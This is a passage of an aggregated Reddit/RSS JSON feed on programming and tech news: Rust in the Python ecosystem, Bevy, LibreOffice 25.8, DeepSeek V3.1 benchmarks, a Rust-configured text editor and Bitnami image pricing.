href=\"https://thenewstack.io/rust-programming-language-guide/\">Rust</a> has emerged as <a href=\"https://thenewstack.io/why-python-is-so-slow-and-what-is-being-done-about-it/\">Python’s performance</a> co-pilot.</p><h2>The Rust Revolution in Python</h2><p>In a <a href=\"https://blog.jetbrains.com/pycharm/2025/08/the-state-of-python-2025/\" rel=\"external \" onclick=\"this.target='_blank';\">blog post</a> about the study — which was based on a survey of 30,000 developers — <a href=\"https://blog.jetbrains.com/pycharm/2025/08/the-state-of-python-2025/#author\" rel=\"external \" onclick=\"this.target='_blank';\">Michael Kennedy</a>, the founder of <a href=\"https://talkpython.fm/\" rel=\"external \" onclick=\"this.target='_blank';\">Talk Python</a> and a <a href=\"https://www.python.org/psf-landing/\" rel=\"external \" onclick=\"this.target='_blank';\">Python Software Foundation</a> Fellow, wrote that “At the <a href=\"https://us.pycon.org/2025/events/language-summit/\" rel=\"external \" onclick=\"this.target='_blank';\">2025 Python Language Summit</a>, core developers shared an eye-opening statistic: ‘Somewhere between one-quarter and one-third of all native code being uploaded to <a href=\"https://thenewstack.io/the-top-5-python-packages-and-what-they-do/\">PyPI</a> for new projects uses Rust.’ This means that when developers start new performance-critical Python projects today, they’re increasingly choosing Rust over traditional C extensions.”</p><h2>Why Rust Is Winning Over C</h2><p>Among the key reasons for Rust’s rapid adoption in the Python ecosystem is performance. Rust delivers C-level performance while maintaining Python’s ease of integration. Rust’s <a href=\"https://stackoverflow.com/questions/69178380/what-does-zero-cost-abstraction-mean\" rel=\"external \" onclick=\"this.target='_blank';\">zero-cost abstractions</a> and efficient memory management make it ideal for performance-critical components.</p><p>Rust also provides memory safety. Unlike C, Rust prevents common programming errors like <a href=\"https://thenewstack.io/secure-coding-in-c-avoid-buffer-overflows-and-memory-leaks/\">buffer overflows and memory leaks</a> at compile time. This makes it dramatically safer for extending Python without introducing security vulnerabilities or crashes.</p><p>In addition, Rust offers a high-quality developer experience with its modern toolchain, excellent error messages, and package manager (<a href=\"https://doc.rust-lang.org/cargo/\" rel=\"external \" onclick=\"this.target='_blank';\">Cargo</a>). It provides a better development experience compared to the often painful process of writing and debugging C extensions.</p><h2>Real-World Success Stories</h2><p>The Python ecosystem already showcases several high-profile Rust success stories:</p><ul><li> has revolutionized data science with DataFrame operations that often outperform <a href=\"https://thenewstack.io/python-pandas-ditches-numpy-for-speedier-pyarrow/\">Pandas</a> by orders of magnitude. Built in Rust, it provides a Python API that feels natural while delivering unprecedented speed for data processing tasks.</li><li> rewrote its core validation engine in Rust, resulting in dramatic performance improvements for data validation and serialization across virtually every Python discipline — from web APIs to machine learning pipelines.</li><li> increasingly relies on Rust-based components. The survey showed that <a href=\"https://thenewstack.io/jetbrains-developer-survey-tracks-rapid-adoption-of-ai-chatgpt/\">FastAPI</a> usage jumped from 29% to 38% (a 30% increase), partly driven by its async-friendly architecture that pairs well with Rust-based server components.</li></ul><h2>The Infrastructure Revolution</h2><p>Rust’s influence extends beyond individual packages to Python’s core infrastructure. Traditional Web Server Gateway Interface (WSGI) servers are giving way to Asynchronous Server Gateway Interface (ASGI) compatible alternatives, many of which are built with Rust. Kennedy cited <a href=\"https://github.com/emmett-framework/granian\" rel=\"external \" onclick=\"this.target='_blank';\">Granian</a>, a new Rust-based application server, as gaining significant traction. He also singled out <a href=\"https://www.uvicorn.org/\" rel=\"external \" onclick=\"this.target='_blank';\">Uvicorn</a>, which, while Python-based, increasingly integrates with Rust components</p><p>Kennedy also noted that two new Python type checkers have emerged, both written in Rust. One is <a href=\"https://github.com/astral-sh/ty\" rel=\"external \" onclick=\"this.target='_blank';\">ty</a> from <a href=\"https://astral.sh/\" rel=\"external \" onclick=\"this.target='_blank';\">Astral</a>, which is described as “an extremely fast Python type checker and language server.” The other is <a href=\"https://pyrefly.org/\" rel=\"external \" onclick=\"this.target='_blank';\">Pyrefly</a> from Meta, which is a high-performance alternative to traditional type checkers like <a href=\"https://mypy-lang.org/\" rel=\"external \" onclick=\"this.target='_blank';\">mypy</a>.</p><p>“They are both vying to be the next generation tooling for type checking. Moreover, both of these tools provide extremely fast language server protocols (LSPs), Kennedy wrote.</p><p>“Notice anything similar? They are both written in Rust, backing up the previous claim that ‘Rust has become Python’s performance co-pilot,’” he added.</p><p>Meanwhile, for enterprises, Rust-enhanced Python delivers tangible benefits. The performance improvements alone can translate into cost savings, including reduced cloud compute costs and lower memory usage. Moreover, faster response times improve customer satisfaction and more efficient code reduces energy consumption, Kennedy said.</p><h2>Advice for Python Developers</h2><p>Kennedy advised Python developers to learn to read Rust.</p><p>Python developers should consider learning the basics of Rust, not to replace Python, but to complement it.</p><p>“As I discussed in our analysis, Rust is becoming increasingly important in the most significant portions of the Python ecosystem,” Kennedy wrote. “I definitely don’t recommend that you become a Rust developer instead of a Pythonista, but being able to read basic Rust so that you understand what the libraries you’re consuming are doing will be a good skill to have.”</p><p>Kennedy also advised Python developers to embrace Rust-enhanced libraries. When choosing between similar packages, consider those with Rust cores — they often provide superior performance without sacrificing Python’s ease of use, he said.</p><p>And Python devs also should consider Rust for extensions, Kennedy advises. Python developers building performance-critical Python extensions should evaluate Rust as their implementation language instead of defaulting to C, he indicated.</p><p>Overall, Rust is not replacing Python — it’s supercharging it. This hybrid approach gives developers the best of both worlds: Python’s expressiveness and ecosystem for application logic, with Rust’s performance for computationally intensive components, the report expresses.</p><div><svg width=\"68px\" height=\"31px\" viewBox=\"0 0 68 31\" version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"></svg></div>","contentLength":5228,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1mvfi2x/rust_pythons_new_performance_engine/"},{"title":"Is Bevy really as unstable as their Introduction makes them out to be?","url":"https://www.reddit.com/r/rust/comments/1mvfamk/is_bevy_really_as_unstable_as_their_introduction/","date":1755697671,"author":"/u/VermicelliLanky3927","guid":235649,"unread":true,"content":"<p>Hai yall, first post on the sub, please let me know if there's anything I should change.</p><p>Although there are a number of well-maintained general purpose game engines listed on <a href=\"https://arewegameyet.rs/\">https://arewegameyet.rs/</a>, like Fyrox and BlueEngine, it seems like the one that is far and away the most popular is Bevy.</p><p>However, despite the fact that Bevy is, at this point, several years old, their <a href=\"https://bevy.org/learn/quick-start/introduction/\">introduction page</a> still claims that they are in the \"early stages of development\" and in particular mention that \"documentation is sparse\" and that every three months, they release a new version with breaking API changes.</p><p>This is odd to me because it always seemed to me that Bevy was highly mature (certainly moreso than many of the other projects on arewegameyet), and had amazing documentation. </p><p>I've been interested in using Bevy for a project for a while now, and this warning has deterred me up to this point, so I wanted to ask the community: For those of you that have used Bevy, what has your experience been like? If you've had to make changes because of an API change, how did migration treat you?</p><p>Thanks in advance, yall :3</p>","contentLength":1107,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"The GPD Pocket 4 Mini is tiny, but geared for a professional audience (KVM, Card Reader, RS-232, 4G LTE options). Is there a way to have similar experience (w/ Linux) on one of the new gaming handhelds like Asus ROG X, Zotac Z One, Steam Deck, maybe with added keyboard/dock?","url":"https://gpdstore.net/gpd-mini-laptop/gpd-pocket-4/","date":1755697285,"author":"/u/spryfigure","guid":234786,"unread":true,"content":"<p>I will start by saying that for a such a tiny device the whole thing feels more like a quality laptop than a \"toy\" that you may expect. This is a serious piece of kit (as it should be at the price!) for getting work done.\nThe keyboard is very nice, compared to a Macbook Pro, it is like-for-like typing feel if a little constrained by the size which is to be expected.\n<p>Performance is exceptional, in fact, I am replacing my desktop Windows PC with it. The built in GPU seems up to the task - I would just say switch off things like FPS counters and benchmarking and just enjoy some games without worrying how many frames per second you are getting - it all feels fine which is the most important thing, many titles that are recent additions to Gamepass work flawlessly on it and you always have that USB 4 port if you want to explore using an eGPU later down the line.\n</p>As for the one annoyance, it's the screen, it is lovely to look at BUT they appear to have done something odd with the rotation, in all but Windows the screen is incorrectly rotated. I think they may have used a portrait orientated panel, as it is always 90 degrees counter clockwise rotated outside Windows. It can be corrected with settings, but makes it very hard to navigate things like GRUB bootloaders or the desktop until it is done via commands.</p>","contentLength":1322,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1mvf4v3/the_gpd_pocket_4_mini_is_tiny_but_geared_for_a/"},{"title":"[R] Independent research uploaded to Zenodo: Exploring robotics, AI, and emotional intelligence frameworks","url":"https://www.reddit.com/r/MachineLearning/comments/1mvev9a/r_independent_research_uploaded_to_zenodo/","date":1755696630,"author":"/u/arthurmorgan18","guid":234662,"unread":true,"content":"<p>I’ve been working over the past two months on a set of independent research frameworks that connect AI, robotics, and human emotional resonance into unified systems. While I’m not part of a university or lab, I’ve documented and archived the work on Zenodo so it can be reviewed openly.</p><p>Some of the key ideas inside: • Eline Synch™ — motion &amp; emotional stabilization for humanoid robots. • EchoMind™ — AI protocol for dolphin communication and ecological repair. • Symbiont Class™ Robotics — merging Neuralink-style BCI, quantum AI, and emotion-aware robotics. • PowerMind™ — reimagining Tesla’s wireless energy vision with modern materials + AI.</p><p>This is early-stage conceptual research, not peer-reviewed, but it’s intended as a seed for discussion, critique, and potential collaboration. I’d love to hear feedback or pushback from this community, especially around feasibility and potential research directions.</p>","contentLength":947,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Dead Space creator is '100 percent' behind AI - 'it's here, just work with it'","url":"https://frvr.com/blog/news/dead-space-creator-is-100-percent-behind-ai-its-here-just-work-with-it/","date":1755695350,"author":"/u/Automatic_Can_9823","guid":234705,"unread":true,"content":"<p>Dead Space creator and Sledgehammer Games co-founder Glen Schofield has revealed he’s ‘100 percent’ behind the use of AI in the games industry.</p><p>Speaking the <a href=\"https://www.youtube.com/watch?v=m8jxDPe2Yqc\">The Games Business</a>, Schofield , who has the likes of Call of Duty, Legacy of Kain and Gex 3D on his resume, said he’s ‘looking forward’ to making another game, but highlighted that when it comes to AI to ‘just work with it’.</p><p>“AI is kicking in, and by the end of the game there will probably be enough AI to save even more money,” the Dead Space lead said. “I don’t know. Man, I am 100 percent behind [AI] because I have been there for a lot of these.</p><p>“I was there for the beginning of the internet, and they were like ‘yeah, the internet’… website, everybody’s going to have a website and now everybody does. So, AI is coming…it’s here, just work with it.”</p><p>Schofield revealed he was a ‘big fan’ of Midjourney, a popular generative art tool, in helping him create art and augment his creative process, claiming it ‘raises the bar’ and lets him dig ‘really, really, deep’.</p><p>“I remember when Photoshop was coming out. Now anybody who did airbrush or anything like that, they were out of work, right? Because computers are going to make it faster. I know how to undo. I now could add airbrush techniques within seconds and all that… but everything just got more complicated.</p><p>“I remember when motion capture was going to take jobs away. I look at animation departments now, it could be 30 people. It always raises the bar. It’s raising it now for me when I’m coming up with ideas and worlds.”</p><p>He added: “I dig really, really, really deep with AI stuff.”</p><p>Schofield, who is set to headline the business area conference at Gamescom Asia in Thailand, also revealed he’s not sure yet what jobs AI will end up creating for those in the games industry.  “I wish I could predict what jobs [will come out of it]. I hear people going we’re going to want prompt engineers,” he said. “And we probably will.”</p><p>Generative AI has been the most controversial form of artificial intelligence in reason years due to the use of copyrighted materials needed to train the technology. Numerous lawsuits have been started over the rise of generative AI with major corporations <a href=\"https://www.bbc.co.uk/news/articles/cg5vjqdm1ypo\">including Disney citing theft of copyrighted materials</a> and plagiarism as key issues with modern AI tools.</p><p>Additionally, there has been heavy pushback from gamers against the use of generative AI in video games. Titles like Call of Duty have been criticised for using tools like Midjourney for paid in-game skins and loading screens with many lambasting the use of these tools as ‘lazy’, especially when users are charged for non-human work. </p>","contentLength":2719,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1mvecib/dead_space_creator_is_100_percent_behind_ai_its/"},{"title":"How Unforgiving Tools Help Your Programming Discipline with Michael Feathers","url":"https://youtube.com/shorts/3Z1uq0Vj5Ys","date":1755693119,"author":"/u/goto-con","guid":234784,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mvdi0n/how_unforgiving_tools_help_your_programming/"},{"title":"[R] How do you make text labeling less painful?","url":"https://www.reddit.com/r/MachineLearning/comments/1mvdey9/r_how_do_you_make_text_labeling_less_painful/","date":1755692899,"author":"/u/vihanga2001","guid":234522,"unread":true,"content":"<p>Hey everyone! I'm working on a university research project about smarter ways to reduce the effort involved in labeling text datasets like support tickets, news articles, or transcripts.</p><p>The idea is to help teams <em>pick the most useful examples to label next</em>, instead of doing it randomly or all at once.</p><p>If you’ve ever worked on labeling or managing a labeled dataset, I’d love to ask you  about what made it slow, what you wish was better, and what would make it feel “worth it.”</p><p>Totally academic no tools, no sales, no bots. Just trying to make this research reflect real labeling experiences.</p><p>You can DM me or drop a comment if open to chat. Thanks so much</p>","contentLength":662,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Adding OCR to Spectacle","url":"https://www.reddit.com/r/linux/comments/1mvddws/adding_ocr_to_spectacle/","date":1755692819,"author":"/u/masterzeng","guid":234583,"unread":true,"content":"<p>EDIT: Hi again, as there seems to be interest in the project, I have created a <a href=\"https://github.com/kbkozlev/spectacle-ocr#\">GitHub</a> Repo and I'm welcoming contribution </p><p>I wanted to share with you my article regarding how you can integrate OCR into Spectacle.</p><p>This allows you to directly extract text from an image without having to use seperate apps or services.</p><p>Here is a <a href=\"https://kozlev.com/ocr-for-spectacle/\">link</a> to the article and a quick demo below</p>","contentLength":366,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Left my tech job after 11 months because they shifted me to a non tech job- did i just ruin my career?","url":"https://images.app.goo.gl/AFju4","date":1755692581,"author":"/u/Rough-Psychology-785","guid":234547,"unread":true,"content":"<a href=\"https://images.app.goo.gl/imghp\"><img src=\"https://images.app.goo.gl/images/branding/googlelogo/1x/googlelogo_color_92x36dp.png\" alt=\"Google Images\"></a><p>Expert reveals 'quickest way' to ruin your career</p><p>Images may be subject to copyright.</p>","contentLength":84,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mvdame/left_my_tech_job_after_11_months_because_they/"},{"title":"Is this project worth my time?","url":"https://www.reddit.com/r/golang/comments/1mvchik/is_this_project_worth_my_time/","date":1755690323,"author":"/u/Dystorti0n","guid":235579,"unread":true,"content":"<p>I started building this tool about a year ago. I keep trying to revisit it but get busy. I have some time to continue working on it, but now trying to weigh up if it's useful enough to continue. <a href=\"https://github.com/Dyst0rti0n/easyhttps\">https://github.com/Dyst0rti0n/easyhttps</a> Basically, adding two lines to your code can turn your frontend, server etc to secure (HTTP -&gt; HTTPS).</p>","contentLength":337,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Why does NVIDIA still treat Linux like an afterthought?","url":"https://www.reddit.com/r/linux/comments/1mvcdk7/why_does_nvidia_still_treat_linux_like_an/","date":1755689992,"author":"/u/ISSELz","guid":234549,"unread":true,"content":"<p>It's so frustrating how little effort NVIDIA puts into supporting Linux. Drivers are unstable, sub-optimally tuned, and far behind their Windows counterparts. For a company that dominates the GPU market, it feels like Linux users get left out. Open-source solutions like Nouveau are worse because they don't even have good support from NVIDIA directly. If NVIDIA really cared about its community, it would take time and effort to make Linux drivers first-class and not an afterthought.</p>","contentLength":485,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Is there a sane way to create effective namespaces for Go's \"enums\"?","url":"https://www.reddit.com/r/golang/comments/1mvc88b/is_there_a_sane_way_to_create_effective/","date":1755689548,"author":"/u/EmbarrassedBiscotti9","guid":234523,"unread":true,"content":"<p>Hello <a href=\"https://www.reddit.com/r/golang\">r/golang</a>. I am rather new to Go and I'm thoroughly Java-brained, so please bare with me.</p><p>I'm aware that Go doesn't have enums, but that something similar can be achieved using types, const, and iota.</p><p>After using this approach, I'm left mildly frustrated when referencing imported enums. This isn't an issue if only a single enum is declared within a package, but becomes a bit muddy if there are multiple (or numerous other unrelated constants).</p><p>E.g. if I had the package  containing Format and ColorModel:</p><pre><code>package enum type Format int const ( PNG Format = iota JPG WEBP ) type ColorModel int const ( GRAYSCALE ColorModel = iota RGB RGBA ARGB CMYK ) </code></pre><p>After importing  elsewhere, referencing values from either set of values doesn't provide any clear differentiation:</p><p>I'm wondering if there is a way to have the above instead be replaced with:</p><pre><code>Format.PNG ColorModel.GRAYSCALE </code></pre><p>I'm aware that creating a dedicated package per enum would work, but the constraint of one package per directory makes that pretty damn unappealing.</p><p>Ordinarily, I'd just stomach the imperfect solutions and crack on. At the moment, though, I'm working with a lot of data sourced from a Java project, and enums are . Something at least resembling enums feels like a must.</p><p>If any of you happen to know of a solution in line with what I'm looking for, I'd appreciate the insight. I'd also appreciate knowing if I'm wasting my time/breath!</p>","contentLength":1406,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"LibreOffice 25.8: smarter, faster and more reliable","url":"https://blog.documentfoundation.org/blog/2025/08/20/libreoffice-25-8/","date":1755689402,"author":"/u/themikeosguy","guid":234493,"unread":true,"content":"<p><strong>The best open source office suite continues to evolve, while maintaining its focus on privacy and digital sovereignty</strong></p><p>Berlin, 20 August 2025 – The Document Foundation announces the release of LibreOffice 25.8. This latest version of the market-leading free open source office suite maintains its focus on digital sovereignty and privacy protection. It offers individuals, organisations, and governments total control over their data and the most comprehensive productivity tools.</p><p>In a global context of growing concern about data privacy, cloud lock-in, and surveillance capitalism, LibreOffice 25.8 provides concrete solutions.</p><p>: The source code is available for inspection and is completely free from proprietary technology constraints.</p><p>: LibreOffice does not collect personal data, usage metrics or diagnostic information, and complies with the data protection regulations required by public administration implementations (GDPR).</p><p>: all features are executed locally on the user’s computer, without the need for an internet or cloud connection.</p><p><strong>Self-Hosted Collaboration</strong>: Integration with on-premises cloud solutions, such as Nextcloud, enables teams to collaborate without sharing information with Big Tech.</p><h3>LibreOffice 25.8: new performance and features</h3><p>: the Welcome/What’s New dialog now offers access to the user interface picker and appearance options, allowing new users to leverage LibreOffice’s flexible UI and personalise the look and feel according to their preferences.</p><p>: everything is faster, from startup to scrolling through large documents – with significant speed improvements on less powerful machines.</p><ul><li>In benchmark tests, Writer and Calc open files up to 30% faster.</li><li>Optimised memory management allows for smoother operation on virtual desktops and thin clients.</li></ul><p><strong>Better Interoperability with Microsoft Office files</strong>, with more accurate handling of DOCX, XLSX and PPTX files and fewer formatting issues, thanks to changes such as:</p><ul><li>a complete overhaul of word hyphenation and spacing</li><li>font management in Impress that is compatible with PowerPoint files</li><li>the addition of new functions in Calc: CHOOSECOLS, CHOOSEROWS, DROP, EXPAND, HSTACK, TAKE, TEXTAFTER, TEXTBEFORE, TEXTSPLIT, TOCOL, TOROW, VSTACK, WRAPCOLS and WRAPROWS.</li></ul><p>There are, of course, other important new features, such as the ability to export to the PDF 2.0 format, and several new ScriptForge library services. The complete list is available here: <a href=\"https://wiki.documentfoundation.org/ReleaseNotes/25.8\">wiki.documentfoundation.org/ReleaseNotes/25.8</a>.</p><p>In terms of operating system support changes, LibreOffice 25.8 will no longer run on Windows 7 or 8/8.1 versions. It is also the last version to run on macOS 10.15. Support for x86 (32-bit) Windows versions is deprecated.</p><h3>LibreOffice 25.8 for Businesses</h3><p>The Document Foundation collaborates with a global network of certified partners who offer enterprise-grade support and maintenance, customised features and integrations, and assistance with user migration and training. A full list of partners can be found here: <a href=\"https://www.libreoffice.org/get-help/professional-support/\">www.libreoffice.org/get-help/professional-support/</a>.</p><h3>Positioning of LibreOffice 25.8</h3><p>LibreOffice 25.8 is completely free and offers a viable alternative to proprietary office suites for individual users, schools, businesses, and public institutions. It contains no advertising, data tracking, or subscriptions.</p><p>It is ideal for students and teachers who need reliable tools for documents, presentations and data analysis, as well as for home users and freelancers looking for a solid, free alternative to Microsoft Office/365 or Google Docs. It is also ideal for public administrations and companies that value data sovereignty and the long-term accessibility of documents.</p><blockquote><p>LibreOffice 25.8 reaffirms our dedication to safeguarding the freedom and privacy of end users in the digital age. With this new release, we ensure that personal information stays where it belongs – with the individual. LibreOffice gives end users full control over their documents, helping them to avoid reliance on third-party platforms that might compromise their data or privacy. It’s about empowering users to work securely, independently and confidently, said Eliane Domingos, chairwoman of The Document Foundation.</p></blockquote><h3>About The Document Foundation</h3><p>The Document Foundation is a non-profit organisation that promotes open document formats and develops LibreOffice, the market-leading free open-source office suite. Its mission is to empower individuals and organisations to maintain control over their data and tools in an increasingly digital world dominated by closed platforms.</p>","contentLength":4536,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1mvc6kd/libreoffice_258_smarter_faster_and_more_reliable/"},{"title":"Typechecker Zoo: minimal Rust implementations of historic type systems","url":"https://sdiehl.github.io/typechecker-zoo/","date":1755687896,"author":"/u/kibwen","guid":234627,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1mvbozj/typechecker_zoo_minimal_rust_implementations_of/"},{"title":"[Media] I've been working on a text editor that is written and configured in Rust. Is there any interest in this?","url":"https://www.reddit.com/r/rust/comments/1mvb640/media_ive_been_working_on_a_text_editor_that_is/","date":1755686203,"author":"/u/AhoyISki","guid":234492,"unread":true,"content":"<p>: Good news! Apparently it does work on Windows! It's just a lot of hassle to install all the things that you need, like gcc, cargo, and all that stuff, but that's just Windows being Windows.</p><p>: It \"works\" on Windows, but it is very laggy and very buggy. The performance on Windows is not indicative of the performance on linux, just saying.</p><p>So, I've been working on a text editor (<a href=\"https://github.com/AhoyISki/duat\">link here</a>) for an embarrassingly long amount of time. It is written  in Rust. Here's a configuration example:</p><pre><code>setup_duat!(setup); use duat::prelude::*; fn setup() { plug!( treesitter::TreeSitter, match_pairs::MatchPairs::new(), kak::Kak::new() ); map::&lt;kak::Insert&gt;(\"jk\", \"&lt;Esc&gt;\"); print::wrap_on_edge(); // Modify every LineNumbers hook::add::&lt;LineNumbers&lt;Ui&gt;&gt;(|_, (cfg, _)| { cfg.align_right().align_main_left() }); hook::add::&lt;StatusLine&lt;Ui&gt;&gt;(|pa, (cfg, _)| { cfg.fmt(status!( \"{name_txt}{Spacer}{}[sep]|{sels_txt}[sep]|{main_txt}\", mode_txt(pa) )) }); form::set(\"sep\", Form::with(\"#506090\")); } </code></pre><p>This file does quite a lot of things: It adds three plugins, maps  to , changes wrapping, realigns , changes the  and sets a custom .</p><p>There are various benefits to using Rust as a config language:</p><ul><li>Cargo is the plugin manager, and <a href=\"http://crates.io\"></a> is the plugin repository;</li><li>Traits can act like a \"guide\" on how to extend functionality;</li><li>People can have a fun excuse to finally learn Rust;</li></ul><p>I have also worked really hard to reduce many of the known drawbacks:</p><ul><li>Compile times: Duat reloads in ~2s give or take, but my computer is a fairly old model;</li><li>Boilerplate: Due to Rust's expressiveness, code can often end up shorter than on \"simpler languages\";</li></ul><p>At the moment, there are some big parts missing (floating widgets, LSP...). Even still, Duat is already incredibly extensible. Here's a short list of some of the things that can be done:</p><ul><li>Custom widgets through the  trait;</li><li>s that control the s and can replicate any multi-cursor text editor's behavior;</li><li>A convenient  struct, supporting styles, alignment, spacers, concealment and \"ghost text\", all with the same  API.</li><li>A really easy to use , which can be modded and updated arbitrarily;</li><li>Custom hooks with the  trait;</li></ul><p>Duat is thoroughly documented, and I am currently working on an <a href=\"https://ahoyiski.github.io/duat\"> guide</a> to gently introduce people to the API. Although at the moment that's still nowhere near complete.</p><p>So yeah, the question in the title. What are your thoughts on this project? Is there any interest in this sort of thing? Should I keep working on it? Because there is a lot of work still to be done, and I don't really know if it is worth it to be completely honest.</p><p>P.s. I don't want to steal valor, this text editor is heavily inspired by <a href=\"https://kakoune.org/\">Kakoune</a>. In fact, the modes of the  are a (still incomplete) mimicry of those in Kakoune.</p><p>Edit: For those who tried installing it and it didn't work, try installing again, I forgot to change the default configuration for some recent API changes.</p><p>Edit2: Here's a summary of what's happening in the gif:</p><ul><li>I'm enabling a  that shows the length of each selection in the selection itself, you can see the little orange numbers in each selection after that;</li><li>I'm pushing a  widget to every  widget. This is how the layout of Duat is constructed, in a very declarative, block by block style;</li><li>I'm replacing the  status part with a . Much like with , the  and  macros are also checked at compile time, so all of its parts should work correctly.</li></ul>","contentLength":3344,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"DeepSeek V3.1 Base Suddenly Launched: Outperforms Claude 4 in Programming, Internet Awaits R2 and V4","url":"https://eu.36kr.com/en/p/3430524032372096","date":1755681637,"author":"/u/Emotional-Plum-5970","guid":234521,"unread":true,"content":"<p>Just last night, DeepSeek officially and quietly launched a brand - new V3.1 version, extending the context length to 128k.</p><p>The newly open - sourced V3.1 model has 685B parameters and supports multiple precision formats, from BF16 to FP8.</p><p>Based on comprehensive public information and the actual tests by domestic expert karminski3, the highlights of this V3.1 update are as follows:</p><p> It performs outstandingly. According to the test data of Aider used in the community, V3.1 ranks first among open - source models.</p><p>: V3.1 achieved a high score of 71.6% in the Aider programming benchmark test, surpassing Claude Opus 4, and at the same time, its inference and response speeds are faster.</p><p> It newly supports the native \"search token\", which means better search support.</p><p>: The \"R1\" label is removed from the online model. Analysts say that DeepSeek is expected to adopt a \"hybrid architecture\" in the future.</p><p>: Each complete programming task only costs $1.01, which is only one - sixtieth of the cost of proprietary systems.</p><p>It's worth mentioning that the official group emphasized that the extension to 128K context was already supported in the previous V3 version.</p><p>People are extremely enthusiastic about this wave of updates.</p><p>Even before the model card was released, DeepSeek V3.1 has already ranked fourth on the Hugging Face trending list.</p><p>The number of DeepSeek fans has exceeded 80,000.</p><p>Seeing this, netizens are even more looking forward to the release of R2!</p><h2><strong>Hybrid inference, outperforming Claude 4 in programming</strong></h2><p>The most obvious change this time is that DeepSeek removed the \"R1\" from \"Deep thinking (R1)\" on the official APP and web version.</p><p>Meanwhile, compared with V3 - base, DeepSeek V3.1 newly adds four special Tokens:</p><p>&lt;｜search▁begin｜&gt; (id: 128796)</p><p>&lt;｜search▁end｜&gt; (id: 128797)</p><p>In this regard, there is speculation that this may imply the integration of inference models and non - inference models.</p><p>In terms of programming, according to the results exposed by netizens, DeepSeek V3.1 scored 71.6% in the Aider Polyglot multi - language programming test, defeating Claude 4 Opus and DeepSeek R1 at one stroke.</p><p>Moreover, its cost is only $1, making it the SOTA among non - inference models.</p><p>The most striking contrast is that V3.1's programming performance is 1% higher than that of Claude 4, and the cost is 68 times lower.</p><p>On the SVGBench benchmark, V3.1 is only second to GPT - 4.1 - mini in strength, far exceeding that of DeepSeek R1.</p><p>In terms of MMLU multi - task language understanding, DeepSeek V3.1 is not inferior to GPT - 5. However, there is still a certain gap between V3.1 and GPT - 5 in programming, graduate - level benchmark Q&amp;A, and software engineering.</p><p>A netizen's actual test shows that in the physical test of simulating the free fall of a small ball in a hexagon, DeepSeek V3.1's understanding ability has been significantly improved.</p><p>We conducted an actual test on V3.1 immediately. First, let's focus on the key point of this model update: the context length.</p><p>Assuming that for Chinese, 1 token ≈ 1–1.3 Chinese characters, then 128K tokens ≈ 100,000–160,000 Chinese characters.</p><p>This is equivalent to <strong>1/6–1/8 of the entire text of \"A Dream of Red Mansions\" (about 800,000–1,000,000 characters)</strong>, or a <strong>super - long doctoral thesis/voluminous academic monograph</strong>.</p><p>The actual test is also quite accurate. DeepSeek told us that it can only read about 9%, that is, approximately one - tenth.</p><p>Since the summary is too long, we intercepted the first three chapters. What do you think of this summary?</p><p>In the 128K context test, the output speed of DeepSeek - V3.1 has been greatly improved compared with the past, and some optimizations have been made in engineering.</p><p>In this update, DeepSeek emphasized the support for context.</p><p>Let's put some pressure on DeepSeek - V3.1 and let it output as much content as possible based on the character \"dream\" to try to reach the context limit.</p><p>However, in the end, the model stopped outputting after outputting about 3000 characters.</p><p>Now let's look at the inference ability.</p><p>For the classic problem of comparing the sizes of 9.11 and 9.9, it can answer correctly in both ways of asking.</p><p>One of the most obvious feelings about this update is that the speed has become much faster.</p><p>Finally, let's take a look at the programming ability.</p><p>DeepSeek's previous model was R1 - 0528, which focused on programming ability.</p><p>Let's see if V3.1 has made greater improvements this time.</p><p>We can only give it a score of 80. It meets</p>","contentLength":4468,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mv9w9g/deepseek_v31_base_suddenly_launched_outperforms/"},{"title":"Who would be down to build a Bitnami alternative (at least on the most common apps)?","url":"https://www.reddit.com/r/kubernetes/comments/1mv9uf2/who_would_be_down_to_build_a_bitnami_alternative/","date":1755681448,"author":"/u/Otherwise-Ad-424","guid":234520,"unread":true,"content":"<p>As the title suggests, why not restart an open-source initiative for Binami-style Docker images and Helm charts, providing secure and hardened apps for the wider community?</p><p>Who would be interested in supporting this? Does it sound feasible?</p><p>I believe having consistent Helm charts and a unified “standard” approach across all apps makes deployment and maintenance much simpler.</p><p>We could start with fewer apps (most used Bitnami ones) and progressively increase coverage.</p><p>We could start a non-profit org. With open source charts and try to pay some people that work full time with \"donations\". </p><p>I'm OK to pay 5k€/year for my company, not &gt;60k€/year.</p>","contentLength":651,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Bitnami Secure Images pricing (FYI)","url":"https://www.reddit.com/r/kubernetes/comments/1mv9ra9/bitnami_secure_images_pricing_fyi/","date":1755681124,"author":"/u/Otherwise-Ad-424","guid":234435,"unread":true,"content":"<p>For those who wanted to know, this is the quote we got from Arrow for Bitnami Secure Images:</p><p>\"Bitnami Secure Images is currently available as a flat rate annual enterprise license, priced at $62,000 USD and it includes access to the full catalog of Bitnami on Debian plus 10 hardened images near-zero-CVEs with all the added benefits of secure images, SLA-backed updates, and enterprise-grade 